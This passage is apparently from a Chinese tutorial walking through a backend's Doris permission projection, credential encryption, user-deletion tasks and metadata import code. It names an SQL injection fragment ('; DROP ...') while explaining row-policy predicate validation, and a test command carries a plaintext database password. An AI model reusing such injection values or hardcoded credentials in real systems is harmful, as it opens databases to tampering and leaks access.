        """以跨存储 Saga 删除未被用户使用的 Doris 查询身份和角色。"""
        role = normalize_doris_role_name(role_name)
        snapshot: _RoleDeletionSnapshot | None = None
        drop_state: DorisRoleIdentityDropState | None = None
        try:
            async with self._repo.session.begin():
                await self._repo.lock_security_mutation()
                identity = await self._repo.get_query_identity(role)
                if identity is None:
                    raise auth_error.RoleNotFoundError
                if await self._repo.count_query_identity_assigned_users(role):
                    raise auth_error.RoleInUseError
                grants = await self._repo.list_role_asset_grants(role)
                policies = await self._doris_repo.list_role_row_policies(role)
                snapshot = self._role_deletion_snapshot(identity, grants, policies)
                try:
                    drop_state = await self._doris_repo.drop_role_identity(
                        role_name=identity.role_name,
                        query_user=identity.query_user,
                    )
                except DorisRoleIdentityDropError as exc:
                    drop_state = exc.state
                    raise
                await self._repo.delete_role_asset_grants(role)
                await self._repo.delete_query_identity(identity)
        except BaseException:
            # Doris 不参与 PostgreSQL 事务；包括提交失败和任务取消在内的任一中断都
            # 必须按已完成步骤恢复，避免真实权限与 PostgreSQL 投影长期分离。
            if snapshot is not None and drop_state is not None:
                await self._compensate_role_deletion(snapshot, drop_state)
```

**`drop_state` 的粒度设计**值得学：删除用户和删除角色是两个独立的 Doris 命令，可能第一个成功第二个失败。所以 Doris 侧返回一个状态对象记录「哪几步已完成」，补偿时按已完成的部分恢复：

```python
        await self._execute(f"DROP USER IF EXISTS {user}")
        state = DorisRoleIdentityDropState(
            query_user_deleted=True,
            role_deleted=False,
        )
        try:
            await self._execute(f"DROP ROLE IF EXISTS {role}")
        except BaseException as exc:
            raise DorisRoleIdentityDropError(state) from exc
```

**`RoleInUseError` 检查**：有用户还在用这个角色时不允许删除，先要求改绑。

### 5.3.6 资产授权投影

**资产标识是分层的**，四层：

```python
@dataclass(frozen=True)
class AssetIdentity:
    """层级化数据资产标识。"""

    data_source: str
    database_name: str | None = None
    table_name: str | None = None
    column_name: str | None = None

    def __post_init__(self) -> None:
        """校验资产层级字段之间的依赖关系。"""
        values = (
            self.data_source,
            self.database_name,
            self.table_name,
            self.column_name,
        )
        if any(
            value is not None and (not value or value != value.strip())
            for value in values
        ):
            raise ValueError("资产标识符不能为空且不能包含前后空白字符")
        if not self.data_source:
            raise ValueError("data_source 不能为空")
        if self.column_name is not None and self.table_name is None:
            raise ValueError("指定 column_name 时必须同时指定 table_name")
        if self.table_name is not None and self.database_name is None:
            raise ValueError("指定 table_name 时必须同时指定 database_name")
```

层级约束（有列必须有表、有表必须有库）在构造时就校验，这样后面所有比较逻辑都不需要再考虑「有列无表」这种畸形数据。

**覆盖判断**：

```python
    def encompasses(self, other: "AssetIdentity") -> bool:
        """判断当前授权是否覆盖目标资产。"""
        own_parts = (
            self.data_source,
            self.database_name,
            self.table_name,
            self.column_name,
        )
        other_parts = (
            other.data_source,
            other.database_name,
            other.table_name,
            other.column_name,
        )
        return all(
            own is None or own == target
            for own, target in zip(own_parts, other_parts, strict=True)
        )
```

语义是：**自己的某一层是 `None` 就等于「这一层不限制」**。所以「授予整个数据库」的授权（`database_name="ecommerce"`, `table_name=None`）能覆盖「某张表」的查询。`zip(..., strict=True)` 保证两边长度一致，防止将来加字段时漏改。

**策略对象**：

```python
@dataclass(frozen=True)
class AssetAccessPolicy:
    """用户资产访问策略快照。"""

    user_id: int
    role_name: str | None = None
    authorization_epoch: UUID | None = None
    grants: frozenset[AssetIdentity] = frozenset()

    def allows(self, asset: AssetIdentity) -> bool:
        """判断是否拥有目标资产的完整访问权。"""
        return any(grant.encompasses(asset) for grant in self.grants)

    def is_visible(self, asset: AssetIdentity) -> bool:
        """判断资产或其任一下级资产是否可见。"""
        return self.allows(asset) or any(
            asset.encompasses(grant) for grant in self.grants
        )
```

**`allows` 和 `is_visible` 的区别是关键**：

| 方法 | 语义 | 用在哪 |
| --- | --- | --- |
| `allows(table)` | 有权访问**整张表**（所有列） | SQL 里的 `SELECT *` 是否放行 |
| `is_visible(table)` | 至少能看到这张表的**某一部分** | 语义召回时这张表要不要出现在候选里 |

举例：用户只有 `orders.amount` 这一列的权限。

- `is_visible(orders)` = True → 召回时 `orders` 表会出现，但只带 `amount` 列（`authorization_filter` 负责裁剪）。
- `allows(orders)` = False → SQL 里写 `SELECT * FROM orders` 会被拒（因为 `*` 会展开出无权列）。

**构建策略**：

```python
    async def get_asset_policy(self, user_id: int) -> AssetAccessPolicy:
        """构建用户当前资产访问策略。"""
        user = await self._repo.get_user_by_id(user_id)
        if user is None:
            raise auth_error.UserNotFoundError
        if not user.is_active:
            raise auth_error.InactiveUserError
        if user.doris_role_name is None:
            return AssetAccessPolicy(user_id=user.id)
        identity = await self._repo.get_query_identity(user.doris_role_name)
        if identity is None:
            return AssetAccessPolicy(user_id=user.id)
        grants = await self._repo.list_role_asset_grants(user.doris_role_name)
        return AssetAccessPolicy(
            user_id=user.id,
            role_name=user.doris_role_name,
            authorization_epoch=identity.authorization_epoch,
            grants=frozenset(self._grant_identity(grant) for grant in grants),
        )
```

**没有角色时返回空策略而不是抛错**。空策略的 `allows` 永远返回 False，所以后续查询自然会被拒绝。这比在策略层抛错更好，因为「没角色」和「有角色但无权限」对上层是同一种处理。

投影数据一致性检查：

```python
    @staticmethod
    def _grant_identity(grant: DorisRoleAssetGrant) -> AssetIdentity:
        """将持久化授权转换为资产标识。"""
        identity = AssetIdentity(
            data_source=grant.data_source,
            database_name=grant.database_name,
            table_name=grant.table_name,
            column_name=grant.column_name,
        )
        if identity.scope.value != grant.scope:
            raise RuntimeError(f"持久化资产授权记录无效: {grant.id}")
        return identity
```

`scope` 字段是从四个名称字段推导出来的（`AssetIdentity.scope` 属性），如果推导结果与库里存的 `scope` 不一致，说明数据被改坏了——这种情况直接抛 `RuntimeError`，而不是「凑合用」。

### 5.3.7 SELECT 授权与行策略

授权操作同样是双写 + 补偿：

```python
    async def grant_select(
        self,
        role_name: str,
        *,
        table_name: str | None,
        columns: Sequence[str],
    ) -> list[DorisRoleAssetGrant]:
        """授予角色库、表或列 SELECT 权限并更新可见性投影。"""
        role = self._normalize_role(role_name)
        normalized_columns = self._normalize_columns(columns)
        assets = self._assets(table_name, normalized_columns)
        granted_columns: tuple[str, ...] = ()
        doris_changed = False
        try:
            async with self._repo.session.begin():
                await self._repo.lock_security_mutation()
                await self._require_role_exists(role)
                await self._validate_target(table_name, normalized_columns)
                existing = [
                    await self._repo.find_asset_grant(
                        role,
                        asset.scope.value,
                        asset.resource_key,
                    )
                    for asset in assets
                ]
                if all(grant is not None for grant in existing):
                    return [grant for grant in existing if grant is not None]
```

**幂等**：如果所有目标投影都已经存在，直接返回，不重复执行 Doris GRANT。

补偿分支：

```python
        except BaseException:
            # Doris 变更不参与 PostgreSQL 回滚；取消任务也必须进入补偿，否则实际
            # 权限会与应用侧可见性投影分离。
            if doris_changed:
                await self._compensate_select(
                    grant=False,
                    role_name=role,
                    table_name=table_name,
                    columns=granted_columns,
                )
            raise
```

回收全部权限时用**逆序补偿**：

```python
        except BaseException:
            for target in reversed(revoked_targets):
                await self._compensate_select(
                    grant=True,
                    role_name=role,
                    table_name=target.table_name,
                    columns=target.columns,
                )
            raise
```

**逆序的原因**：正向是「先收数据库级、再收表级、最后收列级」。如果收完数据库级、收表级时失败，恢复时要**先把表级恢复回来、再恢复数据库级**——否则「恢复数据库级」会覆盖掉表级的中间状态。这是所有补偿逻辑的通用原则：补偿顺序必须与正向顺序相反。

**列名归一化**：

```python
    @staticmethod
    def _normalize_columns(columns: Sequence[str]) -> tuple[str, ...]:
        """校验字段列表无重复。"""
        normalized = tuple(column.strip() for column in columns)
        if any(not column for column in normalized):
            raise auth_error.InvalidDorisPermissionError(detail="列名不能为空")
        if len(set(normalized)) != len(normalized):
            raise auth_error.InvalidDorisPermissionError(detail="列名不能重复")
        return normalized
```

重复列名会让 Doris 的 `GRANT SELECT_PRIV(a, a)` 报错，所以在应用层先拦。

**行策略谓词用 sqlglot 校验**：

```python
    @staticmethod
    def _validate_predicate(
        predicate: str,
    ) -> str:
        """确认行策略输入是单个 SQL 表达式，并保留原始语义。"""
        normalized = predicate.strip()
        if not normalized:
            raise auth_error.InvalidDorisPermissionError(
                detail="行级策略谓词表达式不能为空"
            )
        try:
            statements = sqlglot.parse(normalized, read="doris")
        except ParseError as exc:
            raise auth_error.InvalidDorisPermissionError(
                detail="行级策略谓词表达式语法无效"
            ) from exc
        if len(statements) != 1:
            raise auth_error.InvalidDorisPermissionError(
                detail="行级策略谓词必须为单个布尔表达式"
            )
        return normalized
```

**行策略谓词会被拼进 Doris 的 `CREATE ROW POLICY` 语句里**，属于 SQL 注入的高危点。这里的做法是：用 sqlglot 解析确认它是**一条**合法的 SQL 表达式（不是多条语句，不能注入 `; DROP ...`），然后原样返回。

**注意它没有做「必须是布尔表达式」的 AST 检查**——只检查了语句条数。这是可以改进的地方：`sqlglot` 能拿到 AST，可以进一步校验根节点是 `exp.EQ` / `exp.And` 这类比较/逻辑节点。

### 5.3.8 查询身份解析

这一段很直白，但它是「权限体系落地到查询」的最后一环：

```python
    async def resolve(self, user_id: int) -> ResolvedQueryPrincipal:
        """选择用户唯一 Doris 角色对应的查询身份。"""
        user = await self._repo.get_user_by_id(user_id)
        if user is None:
            raise auth_error.UserNotFoundError
        if not user.is_active:
            raise auth_error.InactiveUserError
        if user.doris_role_name is None:
            raise QueryPrincipalNotConfiguredError("用户尚未配置 Doris 角色")
        identity = await self._repo.get_query_identity(user.doris_role_name)
        if identity is None:
            raise QueryPrincipalNotConfiguredError(
                "用户的 Doris 角色尚未配置可用的查询身份"
            )
        return ResolvedQueryPrincipal(
            role_name=user.doris_role_name,
            authorization_epoch=identity.authorization_epoch,
            query_user=identity.query_user,
            password=self._cipher.decrypt(identity.encrypted_password),
            workload_group=identity.workload_group,
        )
```

`password` 标了 `repr=False`：

```python
@dataclass(frozen=True, slots=True)
class ResolvedQueryPrincipal:
    """服务端为一次查询解析出的 Doris 身份。"""

    role_name: str
    authorization_epoch: UUID
    query_user: str
    workload_group: str
    password: str = field(repr=False)
```

**密码只在内存里存在这一小段时间**。库里存的是 Fernet 密文，只在解析身份时解密，用完就随对象回收。

**Fernet 加解密**（`credential.py` 全文）：

```python
class DorisCredentialCipher:
    """使用密钥加密 Doris 查询密码。"""

    def __init__(self, encryption_key: str) -> None:
        """使用 Fernet 密钥初始化凭据加密器。"""
        try:
            self._fernet = Fernet(encryption_key.encode("ascii"))
        except (ValueError, UnicodeEncodeError) as exc:
            raise ValueError("Doris 凭据加密主密钥格式无效") from exc

    def encrypt(self, password: str) -> str:
        """加密 Doris 查询密码。"""
        if not password:
            raise ValueError("Doris 查询密码不能为空")
        return self._fernet.encrypt(password.encode("utf-8")).decode("ascii")

    def decrypt(self, encrypted_password: str) -> str:
        """解密 Doris 查询密码。"""
        try:
            return self._fernet.decrypt(encrypted_password.encode("ascii")).decode(
                "utf-8"
            )
        except (InvalidToken, UnicodeDecodeError, UnicodeEncodeError) as exc:
            raise DorisCredentialError("Doris 查询凭据解密失败") from exc

    @staticmethod
    def generate_password() -> str:
        """生成仅供服务端保存的随机 Doris 查询密码。"""
        return secrets.token_urlsafe(36)
```

**Fernet 是 AES-128-CBC + HMAC-SHA256 的对称认证加密**——不只是加密，还带完整性校验（`InvalidToken` 就是校验失败）。这意味着密文被篡改会被检测到，而不是解出一堆垃圾。

密码由 `secrets.token_urlsafe(36)` 生成（约 48 个字符，288 位熵），**管理员看不到也输不进**——创建角色时服务端自动生成，加密存库，查询时解密使用。这样「多个用户共享一个 Doris 查询用户」也不会带来凭据泄漏面。

### 5.3.9 用户注销：受理与执行分离

注销是**跨四个存储**的操作：

```
auth 库      users / refresh_tokens / user_deletion_tasks
assistant 库  conversations / 删除墓碑 / LangGraph Checkpoint
meta 库       召回快照
Docker        用户沙箱容器与数据卷
```

同步做会超时，所以拆成「受理」和「执行」两个阶段。

**受理**（HTTP 请求里做，要求快）：

```python
    async def request_deletion(self, user_id: int, *, operator_id: int) -> bool:
        """禁用目标用户并持久化注销任务。"""
        if user_id == operator_id:
            raise auth_error.InvalidUserMutationError(
                detail="不能注销当前操作的管理员账号"
            )

        submitted = await self._state_store.request(user_id, datetime.now(UTC))
        if submitted:
            logger.info(f"用户注销已受理: operator_id={operator_id}, user_id={user_id}")
        return submitted
```

`state_store.request` 在一个事务里做三件事：

```python
    async def request(self, user_id: int, requested_at: datetime) -> bool:
        """禁用用户、吊销令牌并创建注销任务。"""
        async with self._postgres.session() as session:
            repo = IdentityPGRepo(session)
            async with session.begin():
                await repo.lock_security_mutation()
                user = await repo.get_user_by_id_for_update(user_id)
                task = await repo.get_user_deletion_task_for_update(user_id)
                if user is None:
                    if task is not None and task.status == "completed":
                        return False
                    raise auth_error.UserNotFoundError
                if user.is_active and user.is_admin and await repo.count_admins() <= 1:
                    raise auth_error.LastAdministratorError
                await repo.set_user_active(user, False)
                await repo.revoke_user_refresh_tokens(user.id, requested_at)
                await repo.enqueue_user_deletion(user.id, requested_at)
        return True
```

三个关键保护：

1. **不能注销自己**（在 service 层）。
2. **不能注销最后一个管理员**（在 store 层，因为要查 `count_admins`）。否则平台会没人能进管理中心。
3. **立即禁用 + 吊销令牌**。注销请求一受理，用户立刻登不上——不需要等清理完成。

**执行**（Celery 任务里做，可以慢）：

```python
    async def process(self, user_id: int) -> None:
        """幂等执行一个用户的跨存储注销清理。"""
        if await self._state_store.is_completed(user_id):
            logger.info(f"用户注销清理已完成，跳过重复任务: user_id={user_id}")
            return
        logger.info(f"开始用户注销清理编排: user_id={user_id}")
        try:
            await self._conversations.delete_user_conversations(user_id)
            logger.info(f"用户会话资源清理完成: user_id={user_id}")
            await self._sandbox.delete_user_sandbox(user_id)
            logger.info(f"用户沙箱资源清理完成: user_id={user_id}")
            await self._state_store.complete(user_id, datetime.now(UTC))
            logger.info(f"用户注销清理编排完成: user_id={user_id}")
        except Exception as exc:
            await self._record_failure(user_id, exc)
            logger.exception(
                "用户注销清理编排失败: "
                f"user_id={user_id}, error_type={type(exc).__name__}"
            )
            raise
```

**顺序是固定的**：先删会话（连带 Checkpoint、召回快照、沙箱会话目录），再删整个用户的沙箱（容器 + 数据卷），最后删认证用户。

**为什么最后才删用户**：`complete` 里要删 `users` 表那条记录，而 `user_deletion_tasks` 有外键指向它。先删会话和沙箱，即使中途失败，用户记录还在，任务可以重试；如果先删了用户，任务表的外键约束会出问题，而且无法区分「这个 id 是已注销的还是从未存在的」。

`complete` 里有个并发保护：

```python
    async def complete(self, user_id: int, completed_at: datetime) -> None:
        """删除认证用户并完成注销任务。"""
        async with self._postgres.session() as session:
            repo = IdentityPGRepo(session)
            async with session.begin():
                await repo.lock_security_mutation()
                # complete 与失败回写可能来自不同 Worker；行锁保证终态不会被迟到的失败覆盖。
                task = await repo.get_user_deletion_task_for_update(user_id)
                if task is None:
                    raise RuntimeError("用户注销任务记录不存在")
                user = await repo.get_user_by_id_for_update(user_id)
                if user is not None:
                    await repo.delete_user(user)
                await repo.complete_user_deletion(task, completed_at)
```

**注释里的场景很真实**：任务第一次执行失败（记了 `record_failure`），重试时成功。如果那个「失败回写」的网络请求延迟到成功之后才到，就会把已完成的任务标回 `pending`，导致清理重跑一遍。行锁 + 状态检查（`record_failure` 里 `if task.status != "completed"`）解决了这个问题。

**失败重试**：

```python
    async def _record_failure(self, user_id: int, exc: Exception) -> None:
        """记录注销失败原因和下一次重试时间。"""
        now = datetime.now(UTC)
        next_attempt_at = now + timedelta(
            seconds=self._config.user_deletion_retry_seconds
        )
        await self._state_store.record_failure(
            user_id,
            error=f"{type(exc).__name__}: {exc}",
            next_attempt_at=next_attempt_at,
        )
```

失败后抛出去让 Celery 的 `autoretry_for` 生效，同时把 `next_attempt_at` 推后 60 秒——这样 Beat 的 `dispatch_due_user_deletions` 也能捡起来重投。**两套重试机制同时存在**（Celery 的即时重试 + Beat 的定时补投），保证不会漏。

**任务领取用 `skip_locked`**：

```python
    async def claim_due_user_deletions(
        self,
        now: datetime,
        *,
        lease_until: datetime,
        limit: int,
    ) -> list[UserDeletionTask]:
        """原子领取到期且未完成的用户注销任务。"""
        result = await self._session.scalars(
            select(UserDeletionTask)
            .where(
                UserDeletionTask.status == "pending",
                UserDeletionTask.next_attempt_at <= now,
            )
            .order_by(UserDeletionTask.next_attempt_at, UserDeletionTask.user_id)
            .limit(limit)
            .with_for_update(skip_locked=True)
        )
        tasks = list(result)
        for task in tasks:
            task.next_attempt_at = lease_until
        await self._session.flush()
        return tasks
```

**`with_for_update(skip_locked=True)` 是分布式领取的标准做法**：多个 Worker 同时执行这条查询时，被一个 Worker 锁住的行会被其它 Worker 直接跳过，而不是排队等待。这样每个 Worker 拿到不同的任务，没有重复也没有阻塞。

`lease_until` 是**租约**：领取时把 `next_attempt_at` 推到租约到期时间。如果 Worker 在处理过程中挂了，租约到期后任务会被其它 Worker 重新领取。

## 5.4 测试

**没有单元测试目录**（`pyproject.toml` 里声明了 `testpaths = ["tests"]`，但仓库里没有 `tests/`）。

可单独验证的部分：

### 5.4.1 管理员引导（幂等，可反复跑）

```bash
uv run -m scripts.bootstrap_admin
```

预期输出（首次）：

```
Admin bootstrap created: user_id=1, administrator=granted, doris_role=None
```

再跑一次：

```
Admin bootstrap verified: user_id=1, administrator=already-present, doris_role=None
```

如果用户名和邮箱分别属于两个不同用户，会抛 `UserAlreadyExistsError`（初始化账号与现有账号冲突）——这是刻意的保护，避免误把别人的账号提权。

### 5.4.2 登录与刷新（需要后端在跑）

```bash
# 登录
curl -s -X POST http://127.0.0.1:7000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"identifier":"admin","password":"<ADMIN_PASSWORD>"}'
```

预期返回：

```json
{
  "access_token": "eyJ...",
  "refresh_token": "eyJ...",
  "token_type": "bearer",
  "expires_in": 900,
  "refresh_expires_in": 2592000,
  "user": {"id": 1, "username": "admin", "is_admin": true, "doris_role_name": null}
}
```

`expires_in: 900` 对应 `access_token_minutes: 15`，`refresh_expires_in: 2592000` 对应 `refresh_token_days: 30`。

**验证重放检测**（同一个 refresh token 用两次）：

```bash
# 第一次刷新：成功，拿到新令牌对
curl -s -X POST http://127.0.0.1:7000/api/v1/auth/refresh \
  -H "Content-Type: application/json" \
  -d '{"refresh_token":"<旧 refresh token>"}'

# 第二次用同一个旧 token：应该 401
curl -s -X POST http://127.0.0.1:7000/api/v1/auth/refresh \
  -H "Content-Type: application/json" \
  -d '{"refresh_token":"<旧 refresh token>"}'
```

第二次预期返回 `type: "invalid-token"`，而且**第一次拿到的那个新 refresh token 也一起失效了**（整族被吊销）。这是重放检测生效的直接证据。

### 5.4.3 限流

60 秒内对同一个账号连发 11 次登录：

```bash
for i in $(seq 1 11); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://127.0.0.1:7000/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"identifier":"admin","password":"wrong"}'
done
```

预期：前 10 次返回 401（密码错），第 11 次返回 429，响应体里带 `retry_after_seconds`。

### 5.4.4 权限投影一致性

登录后拿 access token，用管理员接口建一个角色并授权，然后在 `auth` 库里对账：

```bash
docker exec -it postgres psql -U atguigu -d auth -c \
  "SELECT role_name, query_user, workload_group, authorization_epoch FROM doris_query_identities;"

docker exec -it postgres psql -U atguigu -d auth -c \
  "SELECT role_name, scope, database_name, table_name, column_name FROM doris_role_asset_grants;"
```

再去 Doris 侧看真实权限：

```bash
docker exec -it doris-fe mysql -h127.0.0.1 -P9030 -uatguigu -p123123 -e \
  "SHOW GRANTS FOR ROLE <role_name>;"
```

**两边必须一致**。如果投影有、Doris 没有（或反过来），说明补偿逻辑出过问题，查 `logs/*.jsonl` 里的「补偿」关键字。

---

# 6. 元数据知识库与语义召回（metadata）

## 6.1 需求说明

这是整个系统「能不能问对问题」的地基。要解决的问题是：

**模型怎么知道该查哪张表、哪个字段？**

Doris 里有 45 张表、上千个字段。表名和字段名往往是缩写（`dw_update_time`、`spu_id`），没有注释根本猜不出含义。把 `SHOW TABLES` 的结果塞给模型没用。

所以需要三层：

```
第 1 层：元数据登记
  人工/脚本维护 conf/meta_config.yaml，声明每张表、每个字段、每条指标的中文描述、别名、示例值
  ↓ 导入
第 2 层：元数据目录（PostgreSQL）
  table_info / column_info / metric_info
  ↓ 索引同步
第 3 层：语义索引（Elasticsearch）
  4 个索引：column / metric / value / query-experience
  ↓ 召回
第 4 层：会话级召回快照（PostgreSQL）
  按 (user_id, conversation_id, query) 累积
```

**输入输出**：

| 能力 | 输入 | 输出 |
| --- | --- | --- |
| 元数据导入 | YAML 文档 + 模式（merge/replace）+ 是否 dry-run | 变更摘要（created/updated/deleted 各类计数） |
| 目录管理 | 单条 CRUD 请求 | 元数据记录 |
| 索引同步 | 字段/指标/取值列表 | 索引同步结果（新增/更新/未变计数） |
| 语义召回 | terms + resource_types | 字段/指标/取值候选 + 表上下文 + 命中依据 |
| 召回快照管理 | query | 累积后的完整上下文 |

**一次召回中间要经过哪些步骤**：

```
recall_context(query, terms, resource_types)
  → 加载全量目录 + 权限过滤（把不可见的表和字段裁掉）
  → 三路并行检索
      全文：ES multi_match，name boost 8 / alias 6 / description 4
      向量：terms 先 embed，再 knn 查 dense_vector
      取值：ES 全文查 value 索引
  → RRF 融合 + 类型内归一化
  → 构建上下文（直接候选 + 外键关联 + 主键）
  → 落库为召回快照（与同 query 的旧快照合并）
```

## 6.2 代码组织规划

```
app/metadata/
├── config.py                 导入文档的 Pydantic 模型（MetaConfig/TableConfig/ColumnConfig/MetricConfig）
├── errors.py                 InvalidMetadataError(422) / MetadataNotFoundError(404) / MetadataConflictError(409)
├── providers.py              三个服务的装配工厂
├── tasks.py                  7 个 Celery 任务
├── task_scheduler.py         把索引同步提交到队列
├── task_submission.py        任务名常量
│
├── api/meta/
│   ├── router.py             /import /export /tables /columns /metrics /sync 系列
│   └── schemas.py            请求/响应模型
│
├── models/
│   ├── catalog.py            TableInfo / ColumnInfo / ValueIndexSyncState / MetricInfo / ColumnMetric
│   ├── recall.py             SemanticRecallSnapshot 与召回记录模型
│   └── search.py             SemanticIndexDocument / 差量 / 召回请求响应
│
├── repositories/
│   ├── postgres.py           MetaPGRepo（目录 + 取值索引状态机）
│   ├── semantic_index.py     SemanticIndexRepo（ES mapping / 差量写入 / 全文与向量查询）
│   ├── column_index.py       ColumnESRepo（继承 SemanticIndexRepo）
│   ├── metric_index.py       MetricESRepo（同上）
│   ├── value_index.py        ValueESRepo（取值索引）
│   ├── recall.py             SemanticRecallPGRepo
│   └── source_doris.py       SourceDorisRepo（探查 Doris 表结构与取值）
│
└── services/
    ├── catalog.py            MetaCatalogService（CRUD + 引用校验 + 删除冲突检测 + 导出）
    ├── import_service.py     MetaImportService（YAML 导入）
    ├── index.py              MetaIndexService（语义索引 + 取值索引水位状态机）
    ├── search.py             SemanticResourceRecallService（多路召回）
    ├── recall.py             SemanticRecallContextService（快照管理）
    ├── authorization_filter.py  MetadataAuthorizationFilter
    └── contracts.py          对外端口协议
```

**关键分层决策**：`column_index.py` 和 `metric_index.py` 都很薄（162 / 160 行），因为公共逻辑全在 `semantic_index.py`（377 行）里。字段和指标的索引结构完全一样（都是「资源 + 文本 + 向量 + payload」），差别只在索引名和 payload 内容。

## 6.3 具体实现

### 6.3.1 元数据 ORM 模型

`app/metadata/models/catalog.py` 里有几个值得讲的细节。

**资源键的生成**：

```python
def column_resource_key(t_name: str, c_name: str) -> str:
    """生成无歧义的表字段联合资源键。"""
    return json.dumps(
        [t_name, c_name],
        ensure_ascii=False,
        separators=(",", ":"),
    )
```

**为什么用 JSON 数组而不是 `f"{t_name}.{c_name}"`**：如果表名或字段名里含 `.`，拼接就会产生歧义——`("a.b", "c")` 和 `("a", "b.c")` 会拼成同一个键。用 JSON 数组编码，分隔符是结构化的，不会撞。

**字段表的自引用外键**：

```python
class ColumnInfo(MetaBase):
    """字段信息。"""

    __tablename__ = "column_info"
    # Repository 在查询后批量填充索引状态；保持非 ORM relationship，避免序列化
    # 阶段触发 AsyncSession 无法安全执行的隐式懒加载。
    __allow_unmapped__ = True

    __table_args__ = (
        ForeignKeyConstraint(
            ["reference_t_name", "reference_c_name"],
            ["column_info.t_name", "column_info.name"],
            ondelete="SET NULL",
        ),
    )
```

两个设计点：

1. **自引用外键**：字段可以引用另一个字段（外键关系）。比如 `orders.customer_id` 引用 `dim_customer.customer_id`。用复合外键 `(reference_t_name, reference_c_name) → (t_name, name)` 表达，`ondelete="SET NULL"` 保证被引用的字段删掉时引用自动清空。
2. **`__allow_unmapped__ = True` + 手工挂载非 ORM 属性**。`value_index_state` 是查询后由仓储批量填充的，不是数据库列。不用 `relationship()` 是因为异步会话里懒加载会报错（`MissingGreenlet`）。代价是**必须记得手工填充**，漏填就是 `None`。

**派生属性用 `@property` 而不是存字段**：

```python
    @property
    def last_sync_mode(self) -> Literal["full", "incremental"] | None:
        """返回最近一次成功同步的模式。"""
        if self.last_full_synced_at is None:
            return "incremental" if self.last_incremental_synced_at else None
        if self.last_incremental_synced_at is None:
            return "full"
        if self.last_full_synced_at >= self.last_incremental_synced_at:
            return "full"
        return "incremental"
```

存两个时间戳，模式靠比较推导。这样不会出现「模式字段和时间戳字段不一致」的脏数据。

**指标的手写 `__init__`**：

```python
    def __init__(
        self,
        *,
        name: str,
        description: str,
        alias: list[str],
        relevant_columns: list[ColumnReference] | None = None,
        meta_version: int = 1,
        index_version: int = 0,
    ) -> None:
        """初始化指标元数据及其关联字段引用。"""
        self.name = name
        self.description = description
        self.alias = alias
        self.relevant_columns = relevant_columns or []
        self.meta_version = meta_version
        self.index_version = index_version
```

因为 `relevant_columns` 是「指标关联了哪些字段」的关系列表，不是数据库列（存在中间表 `column_metric` 里），SQLAlchemy 的声明式映射不会自动处理它。

**快照用于版本比较**：

```python
def serialize_column_examples(examples: list[Any]) -> list[Any]:
    """将字段示例转换为可序列化值。"""
    serialized: list[Any] = []
    for value in examples:
        if isinstance(value, (datetime, date)):
            serialized.append(value.isoformat())
        elif isinstance(value, Decimal):
            serialized.append(float(value))
        else:
            serialized.append(value)
    return sorted(serialized, key=str)
```

这个函数会把 `datetime`/`date` 转 isoformat、`Decimal` 转 `float`，并且 `sorted(key=str)`。**排序是关键**——如果示例值的顺序不稳定（比如数据库返回顺序不同），快照比较会误判成「内容变了」，导致 `meta_version` 无意义地自增、索引被反复重建。

`metadata_snapshot()` 是版本递增的判断依据，它**不包含主键**（`t_name` / `name`），只包含会变的内容：

```
type / description / examples / alias / index_values / reference_*
```

任何一项变化就触发 `meta_version + 1`。

### 6.3.2 导入文档的配置模型

```python
class MetaConfigModel(BaseModel):
    """元数据配置模型基类。"""

    model_config = ConfigDict(extra="forbid")
```

同样是 `extra="forbid"`——YAML 里写错键名会直接 422，而不是静默忽略。

字段引用必须成对：

```python
    @model_validator(mode="after")
    def validate_reference(self) -> "ColumnConfig":
        """校验字段引用必须同时包含表名和字段名。"""
        if (self.reference_t_name is None) != (self.reference_c_name is None):
            raise ValueError("引用表名和引用字段名必须同时提供")
        return self
```

用 `!=` 比较两个 `is None` 的结果，等价于「一个有一个没有」就报错。这比写两个 if 更紧凑。

### 6.3.3 YAML 批量导入

导入主流程（`app/metadata/services/import_service.py`）：

```python
    async def import_metadata(
        self,
        meta_config: MetaConfig,
        mode: ImportMode,
        dry_run: bool,
    ) -> MetaImportResult:
        """校验并批量导入元数据。"""
        if not meta_config.tables and not meta_config.metrics:
            raise meta_error.InvalidMetadataError(detail="元数据导入文档不能为空")

        # 先用短事务取得一致的现状快照；随后访问 Doris 时不占用 PostgreSQL 事务。
        async with self._meta_repo.session.begin():
            existing_tables = {
                table_info.name: table_info
                for table_info in await self._meta_repo.list_table_infos()
            }
            existing_columns = {
                (column_info.t_name, column_info.name): column_info
                for column_info in await self._meta_repo.list_column_infos()
            }
            existing_metrics = {
                metric_info.name: metric_info
                for metric_info in await self._meta_repo.list_metric_infos()
            }
```

**「短事务取快照，I/O 放事务外」是这个模块的核心事务策略**。注释写得很清楚。原因是：导入过程中要访问 Doris 校验表是否存在、字段是否存在、取示例值，这些是网络 I/O，可能几秒到几十秒。如果整个导入包在一个 PG 事务里，那个事务会持锁几十秒，阻塞所有元数据读写。

**REPLACE 模式显式清理索引**：

```python
        # REPLACE 删除的资源已经没有后续同步入口，必须显式清理对应语义索引。
        if mode is ImportMode.REPLACE:
            await self._meta_index_service.delete_metric_indexes(metric_changes.deleted)
            await self._meta_index_service.delete_column_indexes(column_changes.deleted)
```

**为什么必须显式清理**：正常的索引同步流程是「元数据变了 → 投递同步任务 → 任务读元数据写索引」。但被删除的元数据已经不在库里了，同步任务读不到它，也就不会去删它的索引。所以删除路径必须单独处理。

**先失效经验，再投递索引**：

```python
        # 元数据提交后再失效查询经验并投递索引任务，消费者才能读取到新版本。
        await self._asset_invalidator.invalidate_assets(
            table_names=set(table_changes.updated + table_changes.deleted),
            column_keys=set(column_changes.updated + column_changes.deleted),
        )
        changed_column_keys = column_changes.created + column_changes.updated
        changed_metric_names = metric_changes.created + metric_changes.updated
        if changed_column_keys:
            self._semantic_index_scheduler.enqueue_columns(changed_column_keys)
        if changed_metric_names:
            self._semantic_index_scheduler.enqueue_metrics(changed_metric_names)
```

**顺序不能反**。查询经验是基于旧元数据验证过的 SQL，元数据变了经验可能失效。如果先投递索引任务，索引任务读到的还是旧版本；如果先失效经验，但元数据还没提交，失效逻辑会读到旧版本。所以必须「元数据提交 → 失效经验 → 投递索引」。

**变更计算**：

```python
    @staticmethod
    def _get_changes[T: (str, tuple[str, str])](
        existing: dict[T, tuple[Any, ...]],
        imported: dict[T, tuple[Any, ...]],
        mode: ImportMode,
    ) -> ResourceChanges[T]:
        """计算单类元数据的新增、更新和删除主键。"""
        existing_keys = set(existing)
